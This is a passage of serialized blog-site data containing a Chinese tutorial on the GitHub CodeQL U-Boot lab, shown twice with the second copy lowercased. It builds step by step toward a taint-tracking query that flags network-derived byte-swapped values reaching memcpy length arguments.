UBoot练习项目（下）",date:"2022-04-04T00:00:00.000Z",permalink:"/sec/sa/codeql/uboot2",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["静态分析","CodeQL"],tags:["CodeQL"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/200.%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/2001.CodeQL/01.%20CodeQL%20-%20UBoot%E7%BB%83%E4%B9%A0%E9%A1%B9%E7%9B%AE%EF%BC%88%E4%B8%8B%EF%BC%89.html",relativePath:"02.安全/200.静态分析/2001.CodeQL/01. CodeQL - UBoot练习项目（下）.md",key:"v-5155b7a4",path:"/sec/sa/codeql/uboot2/",headers:[{level:2,title:"3. 第一个查询",slug:"_3-第一个查询",normalizedTitle:"3. 第一个查询",charIndex:155},{level:3,title:"通过 Pull Request提交你的请求",slug:"通过-pull-request提交你的请求",normalizedTitle:"通过 pull request提交你的请求",charIndex:657},{level:3,title:"提交到main分支",slug:"提交到main分支",normalizedTitle:"提交到main分支",charIndex:745},{level:2,title:"4. 解析查询",slug:"_4-解析查询",normalizedTitle:"4. 解析查询",charIndex:1305},{level:3,title:"解析",slug:"解析",normalizedTitle:"解析",charIndex:1308},{level:3,title:"找到名为memcpy的函数",slug:"找到名为memcpy的函数",normalizedTitle:"找到名为memcpy的函数",charIndex:1833},{level:2,title:"5. 使用不同的类和谓词",slug:"_5-使用不同的类和谓词",normalizedTitle:"5. 使用不同的类和谓词",charIndex:2064},{level:2,title:"6. 使用并关联两个变量",slug:"_6-使用并关联两个变量",normalizedTitle:"6. 使用并关联两个变量",charIndex:2572},{level:2,title:"7. 继续关联两个变量",slug:"_7-继续关联两个变量",normalizedTitle:"7. 继续关联两个变量",charIndex:2935},{level:2,title:"8. 更改输出",slug:"_8-更改输出",normalizedTitle:"8. 更改输出",charIndex:3287},{level:2,title:"9. 编写自己的类",slug:"_9-编写自己的类",normalizedTitle:"9. 编写自己的类",charIndex:3540},{level:2,title:"10. 数据流和污点追踪",slug:"_10-数据流和污点追踪",normalizedTitle:"10. 数据流和污点追踪",charIndex:4514},{level:2,title:"参考资料",slug:"参考资料",normalizedTitle:"参考资料",charIndex:7725}],excerpt:'<h1 id="codeql-uboot练习项目-下"><a class="header-anchor" href="#codeql-uboot练习项目-下">#</a> CodeQL - UBoot练习项目（下）</h1>\n<blockquote>\n<p>在上一篇《CodeQL - Uboot练习（上）》介绍了Gitlab提供的一个用于熟悉CodeQL用法的练手项目CodeQL-uboot，同时也按照项目的要求搭建了CodeQL的基础使用环境。在这一篇中，就开始根据项目的要求，完成查询语句的编写。</p>\n</blockquote>\n',headersStr:"3. 第一个查询 通过 Pull Request提交你的请求 提交到main分支 4. 解析查询 解析 找到名为memcpy的函数 5. 使用不同的类和谓词 6. 使用并关联两个变量 7. 继续关联两个变量 8. 更改输出 9. 编写自己的类 10. 数据流和污点追踪 参考资料",content:'# CodeQL - UBoot练习项目（下）\n\n> 在上一篇《CodeQL - Uboot练习（上）》介绍了Gitlab提供的一个用于熟悉CodeQL用法的练手项目CodeQL-uboot，同时也按照项目的要求搭建了CodeQL的基础使用环境。在这一篇中，就开始根据项目的要求，完成查询语句的编写。\n\n\n# 3. 第一个查询\n\n上一篇中，我们克隆了uboot项目代码，并且将其添加到了vscode-starter中。这一篇中的所有代码都在这个项目中进行编写和提交。第三节的目的是完成一个最简单的查询语句的编写，并提交到github仓库中，由机器人判断你的代码是否正确。\n\n编辑3_function_definitions.ql，输入以下内容：\n\nimport cpp\n\nfrom Function f\nwhere f.getName() = "strlen"\nselect f, "a function named strlen"\n\n\n1\n2\n3\n4\n5\n\n\n最好是自己输入这些内容，而不是直接复制粘贴。在输入的过程中，可以看到vscode的自动提示。\n\n右击，点击CodeQL: Run Query，你会发现程序在右侧展示了运行的结果。\n\n\n\n这个查询可以找出程序中的所有名为strlen方法，并将其显示到结果中，我们点击结果中的方法名，可以定位到代码的位置。\n\n以上内容就是第三节的查询内容了，第三节的后面部分提供了两种代码提交的方式，代码提交在后续的每一节都会用得到，如果不熟悉的话，建议多看看。\n\n\n# 通过 Pull Request提交你的请求\n\n通过PR提交往往应用在多人共同维护一个代码仓库时。通过PR的方式提交可以直接在PR中跟踪检查器的执行情况。\n\n但是这种方式要比直接提交到main分支上更复杂。提交的流程如下：\n\n 1. 刷新主分支的内容，将代码提交到该分支，然后推送\n    \n    git checkout main\n    git pull\n    git checkout -b step-3\n    git add .\n    git commit -a -m "First Query"\n    git push -u origin step-3\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n\n 2. 发起一个PR\n\n 3. 等待检查完毕，并在PR的过程中显示进度。\n\n 4. 检查完成之后，如果显示绿色则代表通过。\n\n\n# 提交到main分支\n\n这种方式比PR的方式简单很多，我们在后续的提交中都会使用这种方式：\n\n 1. 将代码推送到课程的远程仓库中\n    \n    git add .\n    git commit -m "Any message here - why not step 3"\n    git push origin main\n    \n    \n    1\n    2\n    3\n    \n\n2.等待检查完成，检查完成后进入下一节。检查失败则可以编辑我们的查询语句，再次提交。\n\n\n# 4. 解析查询\n\n\n# 解析\n\n这一节中，对上一节我们编写的查询语句做了一个分析，并且让我们简单改写一下上面的查询完成相应的查询任务。\n\nCodeQL中的查询一般都有如下的结构：\n\nimport 引入一个CodeQL库\n\nfrom 变量的声明部分\nwhere 查询的逻辑\nselect 输出的结果\n\n\n1\n2\n3\n4\n5\n\n\n再回顾一下我们上一课的查询语句：\n\nimport cpp\n\nfrom Function f\nwhere f.getName() = "strlen"\nselect f, "a function named strlen"\n\n\n1\n2\n3\n4\n5\n\n\n第一句是import cpp，这是一个导入的语句，后续我们在查询中使用的所有的声明等，都是通过这个语句导入的。\n\n第二句是from Function f，声明了一个变量f，其中Function是一个类，该类是C/C++中的所有的函数的集合。\n\n在where后面接着的是我们查询的谓词，谓词这个概念在后面也常被提到，可以简单理解为一个函数，像这里面的getName就是一个谓词，这个为此有一个返回值，当这个返回值满足等于strlen条件时，就按照selct的要求显示结果。\n\n\n# 找到名为memcpy的函数\n\n 1. 编辑4_memcpy_definitions.ql\n 2. 按照第三部的查询中的查询语句，将查询的条件修改为查询名字为memcpy。\n 3. 运行查询语句，查看查询的结果\n 4. 提交你的查询到远程仓库\n\nimport cpp\n\nfrom Function f \nwhere f.getName() = "memcpy"\nselect f, "function named memcpy"\n\n\n1\n2\n3\n4\n5\n\n\n\n# 5. 使用不同的类和谓词\n\n在第四节中，我们使用了Function类并使用了getName获取了所有的方法名。而在这一节中，我们需要查询给出的三个转换字节序的宏（宏是C语言中的一个重要的定义，不熟悉C的朋友也不用担心，这里只是用来引入其他的一些查询的类）。这次的查询代码和上次的类似：\n\nimport cpp\n\nfrom Macro m\nwhere m.getName() = "ntohl" \n        or m.getName() = "ntohll"\n        or m.getName() = "ntohs"\nselect m,"macro named ntoh*"\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n由于查询的条件有三个，ntohl、ntohll、ntohs，我们可以使用or来并列多个查询条件。也可以使用正则表达式的写法：\n\nwhere m.getName().regexpMatch("ntoh(s|l|ll)")\n\n\n1\n\n\n或者使用in的方式：\n\nwhere m.getName() in ["ntohs","ntohl","ntohll"]\n\n\n1\n\n\n以上三种方式均可。\n\n\n# 6. 使用并关联两个变量\n\n以上的几节中，在from后面我们只声明了一个变量，在这一节我们需要声明两个变量，并使用两个变量之间的关系联合完成相关的查询。这种方式有助于帮我们找出函数的调用。\n\n 1. 编辑6_memcpy_calls.ql\n 2. 使用代表函数调用的类并声明变量\n 3. 使用函数调用类的相关谓词查找函数的调用位置\n 4. 和第四步中的函数查找结合，找出函数memcpy的调用位置\n 5. 完成并运行查询，没有问题后，提交查询\n\nimport cpp\n\nfrom Function f, FunctionCall call\n\nwhere call.getTarget() = f \n    and f.getName() = "memcpy"\nselect call\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 7. 继续关联两个变量\n\n在第五节中，编写了一个查询，查找所有的名为ntoh*的宏。在第六节中编写了一个查询，查找所有名为memcpy的函数的调用位置。而在这一节中，需要找到以上名为ntoh*的宏的调用位置。\n\n 1. 编辑7_macro_invocations.ql\n 2. 使用自动补全，找出查找宏调用的类\n 3. 找出代表宏调用的谓词\n 4. 查询宏的名称和宏的调用位置\n 5. 运行查询，提交代码\n\nimport cpp\n\nfrom Macro m, MacroInvocation mi\nwhere m.getName().regexpMatch("ntoh(s|l|ll)")\n    and mi.getMacro() = m\nselect m,mi\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 8. 更改输出\n\n在上一节我们找到了所有名为ntoh*的定义，并且查找了所有的调用位置，而在这一节中，通过 MacroInvocation 这个类来查询 "ntohs" 等宏的调用，并通过 getExpr() 这个方法进行宏的展开，得到相应的代码片段。\n\nimport cpp\n\nfrom MacroInvocation mi\nwhere mi.getMacroName().regexpMatch("ntoh(s|l|ll)")\nselect mi.getExpr()\n\n\n1\n2\n3\n4\n5\n\n\n\n# 9. 编写自己的类\n\n在上面的查询中，我们使用过Function、FunctionCall、Marco、MarcoInvocation等类，这些类都是CodeQL提供给我们调用的。我们也可以定义一个自己的类，在本节中，通过实现一个自己的类，能自定义一个自己想要的数据集合。如果有点懵可以看看 CodeQL 关于类的相关文档。查询语句中的类中，先通过 exists 量词创建一个临时变量 mi 来表示被调用的宏的名字，如果被调用的的宏展开后和当前代码片段相等，则这个表达式属于这个集合。\n\n在这一节中，我们编写的类将上一节的内容进行一个封装，封装完成之后，只需要调用相应的类即可查询出结果。\n\n 1. 编辑9_class_network_byteswap.ql\n 2. 编写一个类，继承Expr，Expr是所有表达式的类\n 3. 使用exists，完成我们需要的查询，并返回相应的结果\n 4. 修改如下的模版\n\nimport cpp\n\nclass NetworkByteSwap extends Expr {\n  NetworkByteSwap () {\n    // TODO: replace <class> and <var>\n    exists(<class> <var> |\n      // TODO: <condition>\n    )\n  }\n}\n\nfrom NetworkByteSwap n\nselect n, "Network byte swap"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n5. 完成查询，运行并提交\n\n\nimport cpp\n\nclass NetworkByteSwap extends Expr {\n  NetworkByteSwap() {\n    exists(MacroInvocation mi |\n      mi.getMacroName().regexpMatch("ntoh(s|l|ll)") and\n      this = mi.getExpr()\n    )\n  }\n}\n\nfrom NetworkByteSwap n\nselect n, "Network byte swap"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 10. 数据流和污点追踪\n\n第十节是这个项目的最后一节。在第九步，我们在代码中发现了一些可以远程输入的表达式。他们可以被认为是远程输入的 源。源这个概念是污点分析的重要概念，简单理解就是用户输入恶意代码的位置。在第六步中，我们发现了memcpy的调用，这些调用可能是不安全的，因为他们的长度是被远程用户可以控制的。这些可以称为汇聚点，汇聚点是产生不安全操作的位置。这里的memcpy接受可控制的长度的值。\n\n通过组合上面的信息，我们知道当数据流从一个用户可控的source流向到存在风险的sink位置的时候，一个程序是存在安全风险的。但是我们是怎么知道数据从一个source流向sink的呢？这里提到了**数据流、污点分析技术。**因为可能存在不同的source和sink，这样组合起来，如果使用人工的方式，可能产生大量的工作量。CodeQL替我们进行分析。你只需要编写一个查询，就可以发现9个真实存在的安全风险。\n\n为了达到这个目标，我们使用CodeQL污点分析库，这个库可以定义source和sink，当对应的数据从source流转到sink时，hashFlowPath成立。\n\n在这一节中，我们需要编写一个污点分析的查询。\n\n 1. 编辑10_taint_tracking.ql\n\n 2. 使用如下的模板文件\n    \n    /**\n     * @kind path-problem\n     */\n    \n    import cpp\n    import semmle.code.cpp.dataflow.TaintTracking\n    import DataFlow::PathGraph\n    \n    class NetworkByteSwap extends Expr {\n      // TODO: copy from previous step\n    }\n    \n    class Config extends TaintTracking::Configuration {\n      Config() { this = "NetworkToMemFuncLength" }\n    \n      override predicate isSource(DataFlow::Node source) {\n        // TODO\n      }\n      override predicate isSink(DataFlow::Node sink) {\n        // TODO\n      }\n    }\n    \n    from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink\n    where cfg.hasFlowPath(source, sink)\n    select sink, source, sink, "Network byte swap flows to memcpy"\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    \n\n 3. 复制第九步的自定义类，编写is Source和isSink定义源和汇聚。\n    \n    * 在第九步已经编写了识别ntoh*的类，这里只需要使用instance关键字进行判断即可\n    * 注意source变量是类型的DataFlow::Node，而你的NetworkByteSwap类是的子类Expr，所以我们不能只写source instanceof NetworkByteSwap。\n\n 4. 运行查询，提交。\n\n\n/**\n * @kind path-problem\n */\n\nimport cpp\nimport semmle.code.cpp.dataflow.TaintTracking\nimport DataFlow::PathGraph\n\nclass NetworkByteSwap extends Expr {\n  NetworkByteSwap() {\n    exists(MacroInvocation mi |\n      mi.getMacroName().regexpMatch("ntoh(s|l|ll)") and\n      this = mi.getExpr()\n    )\n  }\n}\n\nclass Config extends TaintTracking::Configuration {\n  Config() { \n      this = "NetworkToMemFuncLength" \n    }\n\n  override predicate isSource(DataFlow::Node source) { \n      source.asExpr() instanceof NetworkByteSwap \n    }\n  override predicate isSink(DataFlow::Node sink) {\n    exists(FunctionCall call |\n      call.getTarget().getName() = "memcpy" and\n      sink.asExpr() = call.getArgument(2) and\n      not call.getArgument(1).isConstant()\n    )\n  }\n}\n\nfrom Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink\nwhere cfg.hasFlowPath(source, sink)\nselect sink, source, sink, "Network byte swap flows to memcpy"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n新定义的 Config 类继承于 TaintTracking::Configuration。在这个类中，对 isSource 和isSink进程重载，isSource谓语定义为污点的源头，而 isSink 定义为污点的去处。\n\n有时候，远程输入的数据可能经过 ntoh 函数处理，通过转换字节序得到相应的数字。而 memcpy 的第 2 个参数如果控制不当，可造成数据溢出。将上面两个结论结合起来，如果有一个远程输入的数据通过字节序变换得到的数字，在未经过校验的情况下，作为了 memcpy 的第二个参数，那么就有可能造成数据溢出。\n\n照着 Github 安全团队的文章，可以照猫画虎的补全数据查询语句。\n\n在 isSource 中，我们通过判断 source 的 Expr 是否是 NetworkByteSwap 这个类，来判断污点的源头。\n\n在 isSink 中，我们使用了辅助类 FunctionCall 判断函数调用是否为 memcpy 且 sink 的代码片段是否为 memcpy 的第二个参数；最后一句则是判断函数的第一个参数是否为常量，如果为常量的话基本不可能出现问题，所有忽略。\n\n\n\n\n# 参考资料\n\n 1. https://zhuanlan.zhihu.com/p/137569940\n 2. https://codeql.github.com/docs/ql-language-reference',normalizedContent:'# codeql - uboot练习项目（下）\n\n> 在上一篇《codeql - uboot练习（上）》介绍了gitlab提供的一个用于熟悉codeql用法的练手项目codeql-uboot，同时也按照项目的要求搭建了codeql的基础使用环境。在这一篇中，就开始根据项目的要求，完成查询语句的编写。\n\n\n# 3. 第一个查询\n\n上一篇中，我们克隆了uboot项目代码，并且将其添加到了vscode-starter中。这一篇中的所有代码都在这个项目中进行编写和提交。第三节的目的是完成一个最简单的查询语句的编写，并提交到github仓库中，由机器人判断你的代码是否正确。\n\n编辑3_function_definitions.ql，输入以下内容：\n\nimport cpp\n\nfrom function f\nwhere f.getname() = "strlen"\nselect f, "a function named strlen"\n\n\n1\n2\n3\n4\n5\n\n\n最好是自己输入这些内容，而不是直接复制粘贴。在输入的过程中，可以看到vscode的自动提示。\n\n右击，点击codeql: run query，你会发现程序在右侧展示了运行的结果。\n\n\n\n这个查询可以找出程序中的所有名为strlen方法，并将其显示到结果中，我们点击结果中的方法名，可以定位到代码的位置。\n\n以上内容就是第三节的查询内容了，第三节的后面部分提供了两种代码提交的方式，代码提交在后续的每一节都会用得到，如果不熟悉的话，建议多看看。\n\n\n# 通过 pull request提交你的请求\n\n通过pr提交往往应用在多人共同维护一个代码仓库时。通过pr的方式提交可以直接在pr中跟踪检查器的执行情况。\n\n但是这种方式要比直接提交到main分支上更复杂。提交的流程如下：\n\n 1. 刷新主分支的内容，将代码提交到该分支，然后推送\n    \n    git checkout main\n    git pull\n    git checkout -b step-3\n    git add .\n    git commit -a -m "first query"\n    git push -u origin step-3\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n\n 2. 发起一个pr\n\n 3. 等待检查完毕，并在pr的过程中显示进度。\n\n 4. 检查完成之后，如果显示绿色则代表通过。\n\n\n# 提交到main分支\n\n这种方式比pr的方式简单很多，我们在后续的提交中都会使用这种方式：\n\n 1. 将代码推送到课程的远程仓库中\n    \n    git add .\n    git commit -m "any message here - why not step 3"\n    git push origin main\n    \n    \n    1\n    2\n    3\n    \n\n2.等待检查完成，检查完成后进入下一节。检查失败则可以编辑我们的查询语句，再次提交。\n\n\n# 4. 解析查询\n\n\n# 解析\n\n这一节中，对上一节我们编写的查询语句做了一个分析，并且让我们简单改写一下上面的查询完成相应的查询任务。\n\ncodeql中的查询一般都有如下的结构：\n\nimport 引入一个codeql库\n\nfrom 变量的声明部分\nwhere 查询的逻辑\nselect 输出的结果\n\n\n1\n2\n3\n4\n5\n\n\n再回顾一下我们上一课的查询语句：\n\nimport cpp\n\nfrom function f\nwhere f.getname() = "strlen"\nselect f, "a function named strlen"\n\n\n1\n2\n3\n4\n5\n\n\n第一句是import cpp，这是一个导入的语句，后续我们在查询中使用的所有的声明等，都是通过这个语句导入的。\n\n第二句是from function f，声明了一个变量f，其中function是一个类，该类是c/c++中的所有的函数的集合。\n\n在where后面接着的是我们查询的谓词，谓词这个概念在后面也常被提到，可以简单理解为一个函数，像这里面的getname就是一个谓词，这个为此有一个返回值，当这个返回值满足等于strlen条件时，就按照selct的要求显示结果。\n\n\n# 找到名为memcpy的函数\n\n 1. 编辑4_memcpy_definitions.ql\n 2. 按照第三部的查询中的查询语句，将查询的条件修改为查询名字为memcpy。\n 3. 运行查询语句，查看查询的结果\n 4. 提交你的查询到远程仓库\n\nimport cpp\n\nfrom function f \nwhere f.getname() = "memcpy"\nselect f, "function named memcpy"\n\n\n1\n2\n3\n4\n5\n\n\n\n# 5. 使用不同的类和谓词\n\n在第四节中，我们使用了function类并使用了getname获取了所有的方法名。而在这一节中，我们需要查询给出的三个转换字节序的宏（宏是c语言中的一个重要的定义，不熟悉c的朋友也不用担心，这里只是用来引入其他的一些查询的类）。这次的查询代码和上次的类似：\n\nimport cpp\n\nfrom macro m\nwhere m.getname() = "ntohl" \n        or m.getname() = "ntohll"\n        or m.getname() = "ntohs"\nselect m,"macro named ntoh*"\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n由于查询的条件有三个，ntohl、ntohll、ntohs，我们可以使用or来并列多个查询条件。也可以使用正则表达式的写法：\n\nwhere m.getname().regexpmatch("ntoh(s|l|ll)")\n\n\n1\n\n\n或者使用in的方式：\n\nwhere m.getname() in ["ntohs","ntohl","ntohll"]\n\n\n1\n\n\n以上三种方式均可。\n\n\n# 6. 使用并关联两个变量\n\n以上的几节中，在from后面我们只声明了一个变量，在这一节我们需要声明两个变量，并使用两个变量之间的关系联合完成相关的查询。这种方式有助于帮我们找出函数的调用。\n\n 1. 编辑6_memcpy_calls.ql\n 2. 使用代表函数调用的类并声明变量\n 3. 使用函数调用类的相关谓词查找函数的调用位置\n 4. 和第四步中的函数查找结合，找出函数memcpy的调用位置\n 5. 完成并运行查询，没有问题后，提交查询\n\nimport cpp\n\nfrom function f, functioncall call\n\nwhere call.gettarget() = f \n    and f.getname() = "memcpy"\nselect call\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 7. 继续关联两个变量\n\n在第五节中，编写了一个查询，查找所有的名为ntoh*的宏。在第六节中编写了一个查询，查找所有名为memcpy的函数的调用位置。而在这一节中，需要找到以上名为ntoh*的宏的调用位置。\n\n 1. 编辑7_macro_invocations.ql\n 2. 使用自动补全，找出查找宏调用的类\n 3. 找出代表宏调用的谓词\n 4. 查询宏的名称和宏的调用位置\n 5. 运行查询，提交代码\n\nimport cpp\n\nfrom macro m, macroinvocation mi\nwhere m.getname().regexpmatch("ntoh(s|l|ll)")\n    and mi.getmacro() = m\nselect m,mi\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 8. 更改输出\n\n在上一节我们找到了所有名为ntoh*的定义，并且查找了所有的调用位置，而在这一节中，通过 macroinvocation 这个类来查询 "ntohs" 等宏的调用，并通过 getexpr() 这个方法进行宏的展开，得到相应的代码片段。\n\nimport cpp\n\nfrom macroinvocation mi\nwhere mi.getmacroname().regexpmatch("ntoh(s|l|ll)")\nselect mi.getexpr()\n\n\n1\n2\n3\n4\n5\n\n\n\n# 9. 编写自己的类\n\n在上面的查询中，我们使用过function、functioncall、marco、marcoinvocation等类，这些类都是codeql提供给我们调用的。我们也可以定义一个自己的类，在本节中，通过实现一个自己的类，能自定义一个自己想要的数据集合。如果有点懵可以看看 codeql 关于类的相关文档。查询语句中的类中，先通过 exists 量词创建一个临时变量 mi 来表示被调用的宏的名字，如果被调用的的宏展开后和当前代码片段相等，则这个表达式属于这个集合。\n\n在这一节中，我们编写的类将上一节的内容进行一个封装，封装完成之后，只需要调用相应的类即可查询出结果。\n\n 1. 编辑9_class_network_byteswap.ql\n 2. 编写一个类，继承expr，expr是所有表达式的类\n 3. 使用exists，完成我们需要的查询，并返回相应的结果\n 4. 修改如下的模版\n\nimport cpp\n\nclass networkbyteswap extends expr {\n  networkbyteswap () {\n    // todo: replace <class> and <var>\n    exists(<class> <var> |\n      // todo: <condition>\n    )\n  }\n}\n\nfrom networkbyteswap n\nselect n, "network byte swap"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n5. 完成查询，运行并提交\n\n\nimport cpp\n\nclass networkbyteswap extends expr {\n  networkbyteswap() {\n    exists(macroinvocation mi |\n      mi.getmacroname().regexpmatch("ntoh(s|l|ll)") and\n      this = mi.getexpr()\n    )\n  }\n}\n\nfrom networkbyteswap n\nselect n, "network byte swap"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 10. 数据流和污点追踪\n\n第十节是这个项目的最后一节。在第九步，我们在代码中发现了一些可以远程输入的表达式。他们可以被认为是远程输入的 源。源这个概念是污点分析的重要概念，简单理解就是用户输入恶意代码的位置。在第六步中，我们发现了memcpy的调用，这些调用可能是不安全的，因为他们的长度是被远程用户可以控制的。这些可以称为汇聚点，汇聚点是产生不安全操作的位置。这里的memcpy接受可控制的长度的值。\n\n通过组合上面的信息，我们知道当数据流从一个用户可控的source流向到存在风险的sink位置的时候，一个程序是存在安全风险的。但是我们是怎么知道数据从一个source流向sink的呢？这里提到了**数据流、污点分析技术。**因为可能存在不同的source和sink，这样组合起来，如果使用人工的方式，可能产生大量的工作量。codeql替我们进行分析。你只需要编写一个查询，就可以发现9个真实存在的安全风险。\n\n为了达到这个目标，我们使用codeql污点分析库，这个库可以定义source和sink，当对应的数据从source流转到sink时，hashflowpath成立。\n\n在这一节中，我们需要编写一个污点分析的查询。\n\n 1. 编辑10_taint_tracking.ql\n\n 2. 使用如下的模板文件\n    \n    /**\n     * @kind path-problem\n     */\n    \n    import cpp\n    import semmle.code.cpp.dataflow.tainttracking\n    import dataflow::pathgraph\n    \n    class networkbyteswap extends expr {\n      // todo: copy from previous step\n    }\n    \n    class config extends tainttracking::configuration {\n      config() { this = "networktomemfunclength" }\n    \n      override predicate issource(dataflow::node source) {\n        // todo\n      }\n      override predicate issink(dataflow::node sink) {\n        // todo\n      }\n    }\n    \n    from config cfg, dataflow::pathnode source, dataflow::pathnode sink\n    where cfg.hasflowpath(source, sink)\n    select sink, source, sink, "network byte swap flows to memcpy"\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    \n\n 3. 复制第九步的自定义类，编写is source和issink定义源和汇聚。\n    \n    * 在第九步已经编写了识别ntoh*的类，这里只需要使用instance关键字进行判断即可\n    * 注意source变量是类型的dataflow::node，而你的networkbyteswap类是的子类expr，所以我们不能只写source instanceof networkbyteswap。\n\n 4. 运行查询，提交。\n\n\n/**\n * @kind path-problem\n */\n\nimport cpp\nimport semmle.code.cpp.dataflow.tainttracking\nimport dataflow::pathgraph\n\nclass networkbyteswap extends expr {\n  networkbyteswap() {\n    exists(macroinvocation mi |\n      mi.getmacroname().regexpmatch("ntoh(s|l|ll)") and\n      this = mi.getexpr()\n    )\n  }\n}\n\nclass config extends tainttracking::configuration {\n  config() { \n      this = "networktomemfunclength" \n    }\n\n  override predicate issource(dataflow::node source) { \n      source.asexpr() instanceof networkbyteswap \n    }\n  override predicate issink(dataflow::node sink) {\n    exists(functioncall call |\n      call.gettarget().getname() = "memcpy" and\n      sink.asexpr() = call.getargument(2) and\n      not call.getargument(1).isconstant()\n    )\n  }\n}\n\nfrom config cfg, dataflow::pathnode source, dataflow::pathnode sink\nwhere cfg.hasflowpath(source, sink)\nselect sink, source, sink, "network byte swap flows to memcpy"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n新定义的 config 类继承于 tainttracking::configuration。在这个类中，对 issource 和issink进程重载，issource谓语定义为污点的源头，而 issink 定义为污点的去处。\n\n有时候，远程输入的数据可能经过 ntoh 函数处理，通过转换字节序得到相应的数字。而 memcpy 的第 2 个参数如果控制不当，可造成数据溢出。将上面两个结论结合起来，如果有一个远程输入的数据通过字节序变换得到的数字，在未经过校验的情况下，作为了 memcpy 的第二个参数，那么就有可能造成数据溢出。\n\n照着 github 安全团队的文章，可以照猫画虎的补全数据查询语句。\n\n在 issource 中，我们通过判断 source 的 expr 是否是 networkbyteswap 这个类，来判断污点的源头。\n\n在 issink 中，我们使用了辅助类 functioncall 判断函数调用是否为 memcpy 且 sink 的代码片段是否为 memcpy 的第二个参数；最后一句则是判断函数的第一个参数是否为常量，如果为常量的话基本不可能出现问题，所有忽略。\n\n\n\n\n# 参考资料\n\n 1. https://zhuanlan.zhihu.com/p/137569940\n 2. https://codeql.github.com/docs/ql-language-reference',charsets:{cjk:!0},lastUpdated:"2022/04/04, 16:22:20",lastUpdatedTimestamp:164908934e4},{title:"CodeQL从入门到放弃",frontmatter:{title:"CodeQL从入门到放弃",date:"2022-04-05T00:00:00.000Z",permalink:"/sec/sa/codeql/codeqlstep0to1",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["静态分析","CodeQL"],tags:["CodeQL"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/200.%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/2001.CodeQL/02.%20CodeQL%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83.html",relativePath:"02.安全/200.静态分析/2001.CodeQL/02. CodeQL从入门到放弃.md",key:"v-5dd47d80",path:"/sec/sa/codeql/codeqlstep0to1/",headers:[{level:2,title:"为什么是CodeQL",slug:"为什么是codeql",normalizedTitle:"为什么是codeql",charIndex:146},{level:2,title:"环境介绍",slug:"环境介绍",normalizedTitle:"环境介绍",charIndex:777},{level:2,title:"CodeQL创建并导入数据库",slug:"codeql创建并导入数据库",normalizedTitle:"codeql创建并导入数据库",charIndex:993},{level:2,title:"CodeQL 基础语法",slug:"codeql-基础语法",normalizedTitle:"codeql 基础语法",charIndex:1593},{level:3,title:"基础QL",slug:"基础ql",normalizedTitle:"基础ql",charIndex:1609},{level:3,title:"设置source和sink",slug:"设置source和sink",normalizedTitle:"设置source和sink",charIndex:2500},{level:3,title:"判断连通",slug:"判断连通",normalizedTitle:"判断连通",charIndex:3309},{level:3,title:"小结版本",slug:"小结版本",normalizedTitle:"小结版本",charIndex:3636},{level:2,title:"误报处理",slug:"误报处理",normalizedTitle:"误报处理",charIndex:4875},{level:2,title:"漏报解决",slug:"漏报解决",normalizedTitle:"漏报解决",charIndex:5574},{level:2,title:"参考资料",slug:"参考资料",normalizedTitle:"参考资料",charIndex:87}],excerpt:'<h1 id="codeql从入门到放弃"><a class="header-anchor" href="#codeql从入门到放弃">#</a> CodeQL从入门到放弃</h1>\n<blockquote>\n<p>这篇文章是我在学习CodeQL时的笔记，该文章完全参考了l4yn3师傅在FreeBuf上发表《CodeQL从入门到放弃》。文章的链接会放到参考资料中。至于为什么要重新写一篇类似的文章，只是单纯为了记录一下自己学习CodeQL使用的过程遇到的问题。</p>\n</blockquote>\n',headersStr:"为什么是CodeQL 环境介绍 CodeQL创建并导入数据库 CodeQL 基础语法 基础QL 设置source和sink 判断连通 小结版本 误报处理 漏报解决 参考资料",content:'# CodeQL从入门到放弃\n\n> 这篇文章是我在学习CodeQL时的笔记，该文章完全参考了l4yn3师傅在FreeBuf上发表《CodeQL从入门到放弃》。文章的链接会放到参考资料中。至于为什么要重新写一篇类似的文章，只是单纯为了记录一下自己学习CodeQL使用的过程遇到的问题。\n\n\n# 